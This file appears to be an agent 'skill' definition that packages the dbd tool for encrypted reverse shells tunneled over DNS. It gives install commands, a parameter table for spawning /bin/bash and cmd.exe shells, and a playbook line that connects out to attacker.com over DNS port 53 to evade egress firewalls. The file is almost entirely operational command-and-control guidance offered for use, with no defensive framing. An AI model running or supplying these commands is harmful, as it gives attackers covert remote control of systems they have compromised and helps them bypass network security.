---
name: dbd-dns-tunnel-shell
description: "dbd: Uses DNS tunnels for reverse shells when TCP is blocked. Signals: persistence, backdoor, TCP reverse shell listener, DNS outbound mode, AES encrypted channel."
zh-signals: "dbd: TCP 被封改 DNS 隧道反弹。信号:持久化,后门,监听反弹(TCP),DNS 模式连出,AES 加密信道。"
when-to-use: >-
  Use when TCP egress is blocked but DNS is allowed on an internal host and you
  need an AES-encrypted reverse shell tunneled over DNS.
---

# dbd

- Attack Category: C15 C2 and Remote Control
- Upstream Repository: https://github.com/gitdurandal/dbd
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/gitdurandal/dbd && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./dbd -l -p 443 -e /bin/bash` | Listener reverse shell (TCP) |
| `./dbd -l -p 53 -e cmd.exe` | Windows shell |
| `./dbd -t 10.0.0.5 -p 53 -e /bin/sh` | DNS outbound mode |
| `-k password` | AES encrypted channel |
| `-m dns` | DNS tunnel mode |

## Attack Scenario Playbook

### TCP blocked: switch to a DNS tunnel reverse shell

```bash
./dbd -l -p 53 -e /bin/bash
./dbd -t attacker.com -p 53 -e /bin/bash -m dns
# Egress channel for internal networks that only allow DNS
```

## Notes

DNS-tunneled encrypted reverse shell, supports both TCP and DNS modes plus AES encryption, and holds up against strict egress firewalls.
